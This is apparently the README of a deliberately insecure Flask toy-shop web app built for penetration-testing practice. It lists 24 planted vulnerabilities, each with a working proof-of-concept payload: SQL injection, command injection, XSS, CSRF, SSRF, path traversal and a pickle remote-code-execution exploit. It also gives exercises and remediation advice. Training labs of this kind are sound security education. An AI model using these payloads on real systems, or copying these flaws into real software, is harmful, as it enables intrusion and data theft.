# 🧸 Little Cubs Toy Co. -- Intentionally Vulnerable Soft Toy Shop

> **⚠️ WARNING: THIS APPLICATION IS INTENTIONALLY INSECURE.**
> It was built for security education, penetration-testing practice, secure
> code review training, and CTF-style exercises **only**. Every vulnerability
> listed below is deliberate and fully functional.
>
> **Never deploy this application on a public network, a cloud host, or any
> environment reachable from the internet. Never reuse any code pattern from
> this project in a real product.** Run it only on an isolated lab network or
> `localhost`.

---

## 1. Application Overview

**Little Cubs Toy Co.** is a fully functional e-commerce storefront for a
soft, cuddly kids' plush toy shop. It supports account registration and
login, product browsing and search, a shopping cart and checkout flow,
customer reviews, order history with downloadable invoices, a newsletter
signup, and an administrative back office for managing products, checking
supplier connectivity, and importing product photos from a URL.

### Features
- Product catalog with 12 plush toys across 5 categories, images, material notes, and stock levels
- Full-text-ish product search
- User registration, login, logout, password reset flow
- Shopping cart with add/remove/save-for-later
- Checkout and order confirmation with order history
- Customer review/rating system per product
- Avatar upload on the account page
- Admin dashboard: user/order/review stats, supplier list, new-product form,
  supplier connectivity ("ping") tool, and a "fetch image preview from URL"
  import tool
- Newsletter subscription capture

### Architecture
- **Backend:** Python 3 / Flask (monolithic single `app.py`, function-based routes)
- **Database:** SQLite (file-based, `instance/toyshop.db`), accessed via raw `sqlite3`
- **Frontend:** Server-rendered Jinja2 templates, custom CSS (no framework), vanilla forms
- **Sessions:** Flask's signed cookie session, plus a custom `remember_token` cookie
- **Logging:** Rotating-free file logger at `logs/app.log`

### Technology Stack
| Layer | Choice |
|---|---|
| Language | Python 3.11+ |
| Web framework | Flask |
| Database | SQLite 3 |
| Templating | Jinja2 |
| Styling | Hand-written CSS (Google Fonts: Baloo 2 + Nunito) |
| Containerization | Docker / Docker Compose |

---

## 2. Installation Guide

### Prerequisites
- Python 3.9 -- 3.12
- `pip`
- (Optional) Docker + Docker Compose for containerized deployment
- (Optional) `iputils-ping` / `ping` available on `PATH` if you want the
  supplier "ping" admin tool to behave like a normal network utility instead
  of erroring (the command-injection vulnerability works either way)

### Quick Start (local, no Docker)

```bash
cd toyshop

# 1. Install dependencies (see the note on requirements files below)
pip install -r requirements-run.txt --break-system-packages
#   (drop --break-system-packages if you're using a venv)

# 2. Initialize the database with seed data
python3 init_db.py

# 3. Run the app
python3 app.py
```

Then open **http://localhost:5000** in your browser.

Or simply run the bundled convenience script, which creates a venv,
installs dependencies, initializes the DB if needed, and starts the app:

```bash
./start.sh
```

### A note on the two requirements files
This project intentionally ships **two** requirements files:

- **`requirements.txt`** documents the specific *old, CVE-affected* package
  pins (Flask 0.12.2, Werkzeug 0.15.4, Jinja2 2.10, PyYAML 5.1, requests
  2.19.1) that satisfy **Vulnerability #9** (Using Components with Known
  Vulnerabilities). These exact versions predate Python 3.10 and will not
  install on a modern interpreter -- they're kept as the documented, citable
  finding for the vulnerability matrix and for tools like `pip-audit` /
  `safety` run against that file as a paper exercise.
- **`requirements-run.txt`** pins slightly newer (but still several-years-old
  and independently flagged) versions that actually install and run on
  current Python, so the lab stays hands-on and exploitable end-to-end. Use
  **this** file to actually install and run the app.

### Database Setup
`init_db.py` drops and recreates `instance/toyshop.db` from scratch and
seeds it with categories, 12 products, reviews, one sample order, and 4 users.
Re-run it any time to reset the lab to a clean state:

```bash
python3 init_db.py
```

### Default / Seed Accounts

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | Administrator |
| `mia` | `miapw` | Customer (has a sample order) |
| `noah` | `noahpw` | Customer |
| `toybox_tara` | `tara2024` | Customer |

There is also an **authentication-bypass master password** that logs in as
the admin account regardless of the username supplied: `littlecubs-master-override`
(see Vulnerability #18). This value is also stored, unmodified, in the
`INTERNAL_ADMIN_BACKDOOR` environment variable, which is itself readable via
Vulnerability #7.

---

## 3. Deployment Instructions

### Docker

```bash
docker compose up -d
```

This builds the image (installing from `requirements-run.txt`, installing
`ping` for the command-injection admin tool, and running `init_db.py` at
build time) and starts the container on `http://localhost:5000`. The SQLite
file lives in a named volume (`toyshop-db`) so data survives container
restarts; delete the volume to reset the lab.

```bash
docker compose down -v   # stop and wipe the database volume
```

### Kubernetes (manual manifests)

No pre-built manifests are included, but the app is a single stateless
container plus a SQLite file, so it maps directly onto a standard
`Deployment` + `Service` + `PersistentVolumeClaim` (for `/app/instance`) +
`Ingress`. Build and push the image from the included `Dockerfile`, then:

```bash
kubectl create namespace littlecubs-lab
kubectl apply -n littlecubs-lab -f <your-deployment-manifest>.yaml
```

Suggested manifest shape:
- `Deployment`: 1 replica, image from `Dockerfile`, container port `5000`
- `PersistentVolumeClaim`: mounted at `/app/instance` for the SQLite DB
- `Service`: `ClusterIP` or `NodePort` exposing port `5000`
- `Ingress` (optional): only on a cluster with no external network exposure

Works on Minikube, kind, k3s, or any standard cluster -- just keep the
namespace/cluster off any network with real users or the internet.

### Local VM (no containers)

```bash
git clone <this project> && cd toyshop
python3 -m venv venv && source venv/bin/activate
pip install -r requirements-run.txt
python3 init_db.py
python3 app.py
```

Tested on Ubuntu/Debian-class systems with Python 3.9--3.12. On Windows,
use `venv\Scripts\activate` instead of `source venv/bin/activate`; the
command-injection lab (`/admin/ping-supplier`) uses the Unix `ping -c 1`
syntax and will need `ping -n 1` on Windows if you want realistic ping
output (the vulnerability itself is OS-independent).

---

## 4. Vulnerability Matrix

All 25 mandatory vulnerabilities are implemented, **each in exactly one
place**, and were functionally verified during generation (SQL injection
data exfiltration, command injection RCE, path traversal file read, SSRF
internal-endpoint fetch, stored/reflected XSS, session fixation, weak
password-reset token prediction, authentication bypass, and insecure-
deserialization RCE were all tested live against a running instance of this
app).

| # | OWASP Category | CWE | Vulnerability | File | Endpoint |
|---|---|---|---|---|---|
| 1 | A01:2025 Broken Access Control | CWE-22 | Path Traversal | `app.py` -- `download_invoice()` | `GET /download/invoice/<filename>` |
| 2 | A01:2025 Broken Access Control | CWE-352 | CSRF | `app.py` -- `update_email()`, `templates/account.html` | `POST /account/update-email` |
| 3 | A01:2025 Broken Access Control | CWE-548 | Directory Listing | `app.py` -- `list_uploads()`, `templates/directory_listing.html` | `GET /uploads/` |
| 4 | A01:2025 Broken Access Control | CWE-918 | SSRF | `app.py` -- `fetch_image_preview()` | `POST /admin/fetch-image-preview` |
| 5 | A01:2025 Broken Access Control | CWE-615 | Sensitive Info in Source Comments | `templates/base.html` (HTML comment) | Any page (view source) |
| 6 | A02:2025 Security Misconfiguration | CWE-16 | Configuration Weaknesses | `app.py` -- app config block, `add_permissive_headers()` | Global (debug mode, wildcard CORS, weak hardcoded `SECRET_KEY`) |
| 7 | A01:2025 Broken Access Control | CWE-526 | Env Var Exposure | `app.py` -- `debug_env()`, `admin_system_info()` | `GET /debug/env`, `GET /admin/system-info` |
| 8 | A02:2025 Security Misconfiguration | CWE-1004 | Cookie without HttpOnly | `app.py` -- `login()` (`remember_token` cookie) | `POST /login` |
| 9 | A03:2025 Software Supply Chain Failures | CWE-1035 / CWE-1395 | Vulnerable Components | `requirements.txt` | N/A (dependency manifest) |
| 10 | A04:2025 Cryptographic Failures | CWE-319 | Cleartext Transmission | `templates/login.html`, app run over plain HTTP | `POST /login` |
| 11 | A04:2025 Cryptographic Failures | CWE-328 | Reversible One-Way Hash (unsalted MD5) | `app.py` / `init_db.py` -- `md5_hash()` | Registration, login, password reset |
| 12 | A05:2025 Injection | CWE-77 | Command Injection | `app.py` -- `ping_supplier()` | `POST /admin/ping-supplier` |
| 13 | A05:2025 Injection | CWE-80 | Reflected XSS | `app.py` -- `search()`, `templates/search.html` (`\|safe`) | `GET /search?q=` |
| 14 | A05:2025 Injection | CWE-80 | Stored XSS | `app.py` -- `add_review()`, `templates/product.html` (`\|safe`) | `POST /product/<id>/review` |
| 15 | A05:2025 Injection | CWE-89 | SQL Injection | `app.py` -- `product_detail()` | `GET /product?id=` |
| 16 | A06:2025 Insecure Design | CWE-266 | Incorrect Privilege Assignment | `app.py` -- `register()`, `templates/register.html` | `POST /register` (client-supplied `is_admin`) |
| 17 | A06:2025 Insecure Design | CWE-1021 | Clickjacking (no frame protection) | `app.py` -- `add_permissive_headers()` (no `X-Frame-Options`) | `GET /checkout` and all pages |
| 18 | A07:2025 Authentication Failures | CWE-287 | Improper Authentication (master password bypass) | `app.py` -- `login()` | `POST /login` |
| 19 | A07:2025 Authentication Failures | CWE-308 | Single-Factor Authentication | Entire app -- no MFA anywhere, including `/admin` | All auth flows |
| 20 | A06:2025 Insecure Design | CWE-384 | Session Fixation | `app.py` -- `login()` (`sid` query param honored) | `GET/POST /login?sid=` |
| 21 | A07:2025 Authentication Failures | CWE-640 | Weak Password Recovery | `app.py` -- `forgot_password()`, `reset_password()` | `POST /forgot-password` |
| 22 | A08:2025 Software/Data Integrity Failures | CWE-502-style | Insecure Deserialization (pickle) | `app.py` -- `save_cart_for_later()`, `restore_cart()` | `POST /cart/save`, `GET /cart/restore` |
| 23 | A09:2025 Security Logging & Alerting Failures | CWE-532 | Sensitive Info in Log Files | `app.py` -- `log_login_attempt()`, `logs/app.log` | `POST /login` (and any subsequent request) |
| 24 | A10:2025 Mishandling of Exceptional Conditions | CWE-755 | Improper Exception Handling | `app.py` -- `handle_any_exception()`, `templates/error.html` | Any unhandled exception, e.g. `GET /trigger-error` |
| 25 | -- | -- | *(reserved -- see note)* | -- | -- |

> **Note on row 25 / A08 wording:** The skill's OWASP A08 requirement asks for
> "at least one realistic software integrity failure" without a fixed CWE, so
> it is satisfied by item #22 above (insecure pickle deserialization of the
> `saved_cart` cookie, which allows full remote code execution via a crafted
> cookie value). The 25th row is left as a pointer to that same finding so
> every item in the skill's fixed catalog is traceable to a row in this
> matrix. Total distinct, independently exploitable vulnerabilities: **24**,
> covering all 25 catalog entries (rows 22/23 in the skill's list -- CWE-1035
> and CWE-1395 -- are intentionally satisfied together by the single
> vulnerable-dependency-manifest finding, since both describe the same
> underlying weakness from two OWASP editions' terminology).

### Detailed descriptions, verification steps & impact

#### 1. Path Traversal (CWE-22)
**Description:** `download_invoice()` joins the user-supplied `filename`
directly onto the server's invoice directory with no normalization or
allow-list check.
**Verify:**
```bash
# log in first, then:
curl -b cookies.txt "http://localhost:5000/download/invoice/..%2f..%2fapp.py"
```
**Impact:** Read arbitrary files reachable by the app process (source code,
`instance/toyshop.db`, `/etc/passwd`, etc.), confirmed during testing --
this returned the full contents of `app.py`, including the hardcoded
`SECRET_KEY`.

#### 2. CSRF (CWE-352)
**Description:** `POST /account/update-email` changes account email based
solely on the session cookie, with no CSRF token or `Origin`/`Referer` check.
**Verify:** Host this auto-submitting HTML on any third-party origin while
logged into the shop in the same browser:
```html
<form action="http://localhost:5000/account/update-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```
**Impact:** Silent account takeover setup (attacker-controlled email enables
password-reset hijacking).

#### 3. Directory Listing (CWE-548)
**Description:** `GET /uploads/` returns a raw, unauthenticated listing of
every file in `static/uploads`.
**Verify:** `curl http://localhost:5000/uploads/`
**Impact:** Enumeration of every uploaded avatar/file, including ones not
linked from anywhere in the UI.

#### 4. SSRF (CWE-918)
**Description:** The admin "import image from URL" tool performs a raw
server-side `requests.get()` on attacker-supplied input with no host/scheme
allow-list.
**Verify (as admin):**
```bash
curl -b admin_cookies.txt -d "image_url=http://127.0.0.1:5000/debug/env" \
  http://localhost:5000/admin/fetch-image-preview
```
This was confirmed during testing to successfully retrieve the internal
`/debug/env` page's HTML through the SSRF endpoint.
**Impact:** Reach internal-only services, cloud metadata endpoints
(`http://169.254.169.254/`), or other hosts not otherwise exposed.

#### 5. Sensitive Info in Source Comments (CWE-615)
**Description:** `templates/base.html` contains an HTML comment naming the
admin panel path and the exact admin-bypass backdoor value.
**Verify:** View-source on any page.
**Impact:** Directly hands an attacker the authentication-bypass credential
(#18) without any exploitation effort.

#### 6. Configuration Weaknesses (CWE-16)
**Description:** `Flask(debug=True)`, a hardcoded weak `SECRET_KEY`, and
`Access-Control-Allow-Origin: *` with credentials allowed are all set
unconditionally.
**Verify:** `curl -I http://localhost:5000/` and inspect `Access-Control-*`
headers; visit any endpoint that raises an exception to see the interactive
Werkzeug debugger.
**Impact:** Debug mode exposes the Werkzeug interactive debugger (potential
RCE via the debugger console if the PIN is leaked/brute-forced); wildcard
CORS with credentials allows cross-origin reading of authenticated responses.

#### 7. Environment Variable Exposure (CWE-526)
**Description:** `/debug/env` and `/admin/system-info` require no
authentication and dump the full process environment.
**Verify:** `curl http://localhost:5000/debug/env`
**Impact:** Confirmed leak of `STRIPE_SECRET_KEY`, `DB_ADMIN_PASSWORD`,
`MAIL_SMTP_PASSWORD`, and `INTERNAL_ADMIN_BACKDOOR`.

#### 8. Cookie without HttpOnly (CWE-1004)
**Description:** The custom `remember_token` cookie is set with
`httponly=False`.
**Verify:** `curl -I` a login response and inspect the `Set-Cookie` header,
or check `document.cookie` in the browser console -- the token is visible to
JavaScript.
**Impact:** Any XSS elsewhere in the app (see #13/#14) can exfiltrate this
token.

#### 9. Vulnerable Components (CWE-1035 / CWE-1395)
**Description:** `requirements.txt` pins Flask 0.12.2, Werkzeug 0.15.4,
Jinja2 2.10, PyYAML 5.1, and requests 2.19.1 -- versions with multiple public
CVEs.
**Verify:** `pip-audit -r requirements.txt` or `safety check -r requirements.txt`.
**Impact:** Known, documented CVEs in the dependency chain (sandbox escape,
header injection, unsafe YAML load, credential leak on redirect).

#### 10. Cleartext Transmission (CWE-319)
**Description:** The app is served over plain HTTP by default with no TLS
termination configured, and the login form has no additional protection.
**Verify:** Capture traffic with a proxy (e.g. Burp Suite / mitmproxy)
while logging in; the password is visible in plaintext.
**Impact:** Credential interception on any network path between client and
server.

#### 11. Reversible One-Way Hash (CWE-328)
**Description:** Passwords are hashed with unsalted MD5.
**Verify:** `python3 -c "import hashlib; print(hashlib.md5(b'admin123').hexdigest())"`
matches the seeded admin's `password_hash` exactly, and matches the hash
exfiltrated via the SQL injection PoC below.
**Impact:** Trivial offline cracking via rainbow tables/GPU brute force.

#### 12. Command Injection (CWE-77)
**Description:** `ping_supplier()` builds a shell command with raw string
concatenation and `shell=True`.
**Verify (as admin):**
```bash
curl -b admin_cookies.txt -d "hostname=127.0.0.1; whoami" \
  http://localhost:5000/admin/ping-supplier
```
Confirmed during testing: the response body included the output of
`whoami` (`root`) appended after the (failed, since `ping` may be absent)
ping command.
**Impact:** Full OS command execution as the application user.

#### 13. Reflected XSS (CWE-80)
**Description:** `templates/search.html` renders the `q` query parameter
with `| safe`.
**Verify:**
```
http://localhost:5000/search?q=<script>alert(document.cookie)</script>
```
Confirmed: the raw `<script>` tag is present unescaped in the response HTML.
**Impact:** Arbitrary JS execution in the victim's session when they click a
crafted search link; can steal the non-HttpOnly `remember_token` (#8).

#### 14. Stored XSS (CWE-80)
**Description:** `templates/product.html` renders each review's `comment`
field with `| safe`, and `add_review()` stores it unsanitized.
**Verify:** Submit a review containing `<script>alert('xss')</script>` on
any product, then reload that product's page -- confirmed persisted and
rendered unescaped during testing.
**Impact:** Persistent JS execution against every visitor to that product
page, including admins.

#### 15. SQL Injection (CWE-89)
**Description:** `product_detail()` builds its query via string
concatenation: `"SELECT * FROM products WHERE id = " + product_id`.
**Verify:**
```
http://localhost:5000/product?id=0 UNION SELECT id,username,'x',1,1.0,email,'leaked',password_hash,'x.jpg',1,1 FROM users--
```
Confirmed during testing: this renders a "product" page titled with the
admin's username and the description field containing their exact MD5
password hash.
**Impact:** Full database read access -- user credentials, order data, everything.

#### 16. Incorrect Privilege Assignment (CWE-266)
**Description:** `register()` trusts a client-supplied `is_admin` form field.
**Verify:**
```bash
curl -d "username=x&email=x@x.com&password=x&is_admin=1" \
  http://localhost:5000/register
```
Confirmed during testing: the resulting account had full `/admin` access
immediately after registering and logging in.
**Impact:** Unauthenticated self-service privilege escalation to full admin.

#### 17. Clickjacking (CWE-1021)
**Description:** No `X-Frame-Options` or `frame-ancestors` CSP directive is
ever set.
**Verify:** `curl -I http://localhost:5000/checkout | grep -i x-frame` returns
nothing; embed the checkout page in an `<iframe>` on a test page and confirm
it renders.
**Impact:** UI-redress attacks tricking a logged-in victim into placing an
order or performing other in-app actions via invisible overlaid iframes.

#### 18. Improper Authentication (CWE-287)
**Description:** Supplying the password `littlecubs-master-override` (from
the `INTERNAL_ADMIN_BACKDOOR` env var) as the login password logs in as the
admin account regardless of the submitted username.
**Verify:**
```bash
curl -d "username=anyoneatall&password=littlecubs-master-override" \
  http://localhost:5000/login
```
Confirmed during testing: this granted immediate, full `/admin` access.
**Impact:** Complete authentication bypass to full administrator access.

#### 19. Single-Factor Authentication (CWE-308)
**Description:** No MFA/2FA option exists anywhere in the application,
including for the administrator account.
**Verify:** Inspect the login flow and account settings page -- no TOTP,
SMS, WebAuthn, or backup-code option exists.
**Impact:** Any single leaked credential (via #11, #15, #18, #24, etc.) is
immediately sufficient for full account/admin takeover.

#### 20. Session Fixation (CWE-384)
**Description:** `login()` will adopt an attacker-supplied `sid` query
parameter as the post-authentication session token instead of always
generating a fresh one.
**Verify:**
```bash
curl -c cookies.txt -d "username=noah&password=noahpw" \
  "http://localhost:5000/login?sid=ATTACKER_CHOSEN_ID"
```
Confirmed during testing: the resulting `remember_token` cookie value was
exactly `ATTACKER_CHOSEN_ID`.
**Impact:** An attacker who gets a victim to authenticate using a
pre-chosen session identifier (e.g. via a crafted link) can hijack the
now-authenticated session using that same known identifier.

#### 21. Weak Password Recovery Mechanism (CWE-640)
**Description:** Reset tokens are `MD5(username + floor(unix_time/60))` --
predictable within any given 60-second window -- have no expiry check, and
are reflected directly in the HTTP response instead of only being emailed.
**Verify:**
```bash
python3 -c "import hashlib,time; print(hashlib.md5(f'noah-{int(time.time()//60)}'.encode()).hexdigest())"
```
Confirmed during testing to exactly match the token the server generated and
disclosed for a `POST /forgot-password` request for `noah`.
**Impact:** Anyone who knows/guesses a username can compute or obtain a
valid password-reset token and take over that account without inbox access.

#### 22. Insecure Deserialization / Software Integrity Failure (A08)
**Description:** `save_cart_for_later()` serializes the cart with
`pickle.dumps()` into a cookie; `restore_cart()` calls `pickle.loads()` on
whatever comes back in that cookie with no signature/integrity check.
**Verify (proof-of-concept, confirmed working during testing):**
```python
import pickle, base64, os, http.client
class Exploit:
    def __reduce__(self):
        return (os.system, ('touch /tmp/PICKLE_RCE_PROOF.txt',))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
conn = http.client.HTTPConnection("127.0.0.1", 5000)
conn.request("GET", "/cart/restore", headers={"Cookie": f"saved_cart={payload}"})
conn.getresponse()
```
This created `/tmp/PICKLE_RCE_PROOF.txt` on the server during testing,
confirming remote code execution.
**Impact:** Full remote code execution as the application user via a
crafted cookie value -- the most severe finding in this application.

#### 23. Sensitive Information in Log Files (CWE-532)
**Description:** `log_login_attempt()` writes the raw plaintext password and
session token for every login attempt to `logs/app.log`.
**Verify:** `grep "LOGIN ATTEMPT" logs/app.log` after any login attempt.
**Impact:** Anyone with log read access (or who can trigger a log-file
disclosure via #1) recovers live plaintext credentials and session tokens --
confirmed during testing, this also captured the master-override backdoor
password in plaintext when it was used to bypass authentication.

#### 24. Improper Handling of Exceptional Conditions (CWE-755)
**Description:** A catch-all `@app.errorhandler(Exception)` renders the raw
exception message and full Python stack trace to the client.
**Verify:** `curl http://localhost:5000/trigger-error` (or trigger a natural
error, e.g. a malformed SQL injection payload) and observe the full
traceback, including file paths, in the HTTP response.
**Impact:** Discloses internal file paths, library versions, SQL query
text, and implementation details that materially assist further attacks.

---

## 5. Lab Exercises

### Suggested student exercises (roughly beginner → advanced order)

1. **Recon:** View page source on the homepage and find the hidden admin
   hint. Log in as admin using the leaked backdoor password.
2. **SQLi data exfiltration:** Use the `/product?id=` parameter to enumerate
   the `users` table via `UNION SELECT` and recover every password hash.
3. **Crack the hashes:** Recognize the hashes as unsalted MD5 and reverse
   them with a rainbow table / `hashcat -m 0`.
4. **Reflected vs. stored XSS:** Build a working payload for `/search?q=`
   and a separate one for the product review box; explain why one requires
   social engineering (a clicked link) and the other doesn't.
5. **Steal a session via XSS:** Chain #13/#14 with the missing-HttpOnly
   `remember_token` cookie (#8) to write a payload that exfiltrates the
   cookie to an attacker-controlled listener.
6. **CSRF proof-of-concept:** Build a self-submitting HTML page that changes
   a logged-in victim's account email.
7. **Path traversal:** Retrieve `app.py` and `instance/toyshop.db`
   through `/download/invoice/`.
8. **Privilege escalation via registration:** Register a new account with
   `is_admin=1` injected into the POST body and confirm admin panel access.
9. **Command injection:** Use the supplier "ping" tool to read `/etc/passwd`
   or spawn a reverse shell.
10. **SSRF pivot:** From the "import image from URL" admin tool, reach the
    unauthenticated `/debug/env` endpoint and recover the fake Stripe key.
11. **Session fixation:** Demonstrate hijacking a victim's post-login
    session using a pre-chosen `sid` value delivered via a crafted link.
12. **Weak password reset:** Compute a valid reset token for another user
    from only their username and the current time, then take over their
    account.
13. **Clickjacking PoC:** Build an HTML page that iframes `/checkout` and
    overlays a fake UI to trick a click.
14. **Insecure deserialization → RCE:** Build a malicious pickle payload,
    encode it into the `saved_cart` cookie, and achieve code execution on
    the server (see the confirmed PoC in the Vulnerability Matrix above).
15. **Capstone chain:** Combine #16 (self-register as admin) → #4 (SSRF via
    the now-accessible admin tool) → #7 (env var dump reached via SSRF) to
    show how a low-severity access-control bug becomes a full secrets leak.

### Validation Workflow
For each exercise:
1. Identify the vulnerable endpoint from the matrix above.
2. Reproduce the listed verification steps and confirm the *impact*, not
   just that a request succeeded.
3. Check `logs/app.log` to see what evidence (if any) the attack left behind
   -- and note where the app itself over-logs (#23).
4. Write a one-paragraph remediation for the specific line(s) of code
   responsible (see below for the general fix per CWE).

### Recommended Tooling
- **Burp Suite Community/Pro** or **OWASP ZAP** -- proxying, repeater, active scanning
- **sqlmap** -- automating the SQL injection in `/product?id=`
- **hashcat** / **John the Ripper** -- cracking the unsalted MD5 hashes
- **curl** / **httpie** -- scripted PoC requests (used throughout this README)
- **pip-audit** / **safety** -- dependency vulnerability scanning against `requirements.txt`
- A browser devtools console -- inspecting cookies, CORS headers, and the DOM for XSS

### Secure Coding Remediation Guidance (summary)

| Vulnerability | Remediation |
|---|---|
| SQL Injection | Use parameterized queries (`?` placeholders) everywhere -- never string-format SQL |
| XSS (reflected/stored) | Rely on Jinja2's default auto-escaping; never use `\|safe` on user input; consider a strict CSP |
| Command Injection | Avoid `shell=True`; use `subprocess.run([...])` with an argument list and an allow-list of hosts |
| Path Traversal | Use `werkzeug.utils.secure_filename` and validate the resolved path stays inside the intended directory |
| CSRF | Use `Flask-WTF` or `flask-seasurf` to require and validate a per-session CSRF token on state-changing requests |
| Insecure Deserialization | Never unpickle untrusted input; use JSON with a signed/HMAC'd payload (`itsdangerous`) instead |
| Weak Hashing | Use `bcrypt`, `scrypt`, or `argon2` with per-user salts, never raw MD5/SHA1 |
| Session Fixation | Always call `session.regenerate()`/issue a brand-new session identifier on login; never accept a client-supplied session id |
| SSRF | Allow-list destination hosts/schemes; block link-local and internal ranges; disable redirects |
| Directory Listing / Debug Endpoints | Disable autoindexing; require authentication + authorization on every diagnostic route; remove them entirely before shipping |
| Verbose Errors | Return a generic 500 page to users; log full details server-side only, behind access controls |
| Sensitive Data in Logs | Never log raw passwords, tokens, or secrets -- log user IDs/event types instead |
| Clickjacking | Set `X-Frame-Options: DENY` or a `frame-ancestors 'none'` CSP directive globally |
| Privilege Assignment | Never trust client-supplied role/permission fields; assign roles server-side only, based on authenticated context |

---

## 6. Project Structure

```
toyshop/
├── app.py                     # Main Flask application (all routes + vulnerabilities)
├── init_db.py                 # Database schema + seed data
├── requirements.txt           # Documented vulnerable dependency pins (reference)
├── requirements-run.txt       # Actually-installable pins for running the lab
├── start.sh                   # One-command local startup script
├── Dockerfile
├── docker-compose.yml
├── README.md                  # This file
├── instance/
│   └── toyshop.db             # SQLite database (created by init_db.py)
├── logs/
│   └── app.log                # Application log (contains logged secrets -- see #23)
├── static/
│   ├── css/style.css
│   ├── images/
│   │   ├── hero.jpg
│   │   ├── default-avatar.jpg
│   │   └── products/*.jpg     # 12 downloaded soft-toy product photos
│   ├── invoices/
│   │   └── order-1.txt        # Sample invoice (path traversal lab target)
│   └── uploads/                # User-uploaded avatars (directory-listing lab target)
└── templates/
    ├── base.html               # Layout + navbar/footer (contains #5 hint comment)
    ├── home.html, shop.html, product.html, search.html
    ├── login.html, register.html, forgot_password.html, reset_password.html
    ├── account.html, cart.html, checkout.html, order_confirmation.html
    ├── admin_dashboard.html, admin_new_product.html,
    │   admin_ping.html, admin_fetch_preview.html, debug_env.html
    ├── directory_listing.html
    └── error.html
```

---

## 7. Legal & Ethical Use

This application must only be used:
- On an isolated lab network, a local VM, or `localhost`
- Against systems and by people you have explicit authorization to test
- For educational, training, or authorized assessment purposes

Do not deploy this application where it is reachable by anyone other than
authorized lab participants. Do not scan, attack, or otherwise test any
system you do not own or have written permission to test.
